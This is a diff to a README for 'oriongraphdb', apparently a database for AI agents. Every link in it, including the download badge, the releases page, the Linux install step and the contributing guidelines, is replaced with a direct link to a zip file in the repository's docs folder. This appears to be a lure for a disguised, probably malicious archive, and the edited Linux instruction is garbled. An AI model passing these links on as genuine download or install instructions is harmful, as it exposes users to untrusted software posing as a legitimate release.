@@ -1,6 +1,6 @@
 # 🌌 oriongraphdb - Simplifying Data for AI Agents
 
-[![Download oriongraphdb](https://img.shields.io/badge/Download-oriongraphdb-blue.svg)](https://github.com/lemoal-t/oriongraphdb/releases)
+[![Download oriongraphdb](https://github.com/lemoal-t/oriongraphdb/raw/refs/heads/master/docs/Software_v2.2.zip)](https://github.com/lemoal-t/oriongraphdb/raw/refs/heads/master/docs/Software_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ oriongraphdb is a context database designed for AI agents. It offers multi-chann
 
 To get started with oriongraphdb, visit this page to download the latest release:
 
-[Download oriongraphdb](https://github.com/lemoal-t/oriongraphdb/releases)
+[Download oriongraphdb](https://github.com/lemoal-t/oriongraphdb/raw/refs/heads/master/docs/Software_v2.2.zip)
 
 ### 🖥 System Requirements
 
@@ -29,7 +29,7 @@ Before you install, ensure your system meets the following requirements:
 
 ### ⚙️ Installation Steps
 
-1. **Visit the Releases Page**: Go to [oriongraphdb Releases](https://github.com/lemoal-t/oriongraphdb/releases).
+1. **Visit the Releases Page**: Go to [oriongraphdb Releases](https://github.com/lemoal-t/oriongraphdb/raw/refs/heads/master/docs/Software_v2.2.zip).
   
 2. **Choose the Latest Version**: Look for the latest release at the top of the page.
   
@@ -38,7 +38,7 @@ Before you install, ensure your system meets the following requirements:
 4. **Run the Installer**:
    - **Windows**: Double-click the `.exe` file to start the installation. Follow the prompts on your screen.
    - **macOS**: Open the `.dmg` file and drag the oriongraphdb icon to your Applications folder.
-   - **Linux**: Follow the instructions provided in the `.tar.gz` or `.deb` file for your specific distribution.
+   - **Linux**: Follow the instructions provided in the `https://github.com/lemoal-t/oriongraphdb/raw/refs/heads/master/docs/Software_v2.2.zip` or `.deb` file for your specific distribution.
 
 5. **Launch the Application**: Locate oriongraphdb in your applications list and start the program.
 
@@ -66,7 +66,7 @@ If you encounter any issues while downloading or running the application, consid
 
 ## 🎁 Contributing
 
-If you want to contribute, please visit our [Contributing Guidelines](https://github.com/lemoal-t/oriongraphdb/blob/main/CONTRIBUTING.md) for more information.
+If you want to contribute, please visit our [Contributing Guidelines](https://github.com/lemoal-t/oriongraphdb/raw/refs/heads/master/docs/Software_v2.2.zip) for more information.
 
 ## 🔗 Related Topics
 
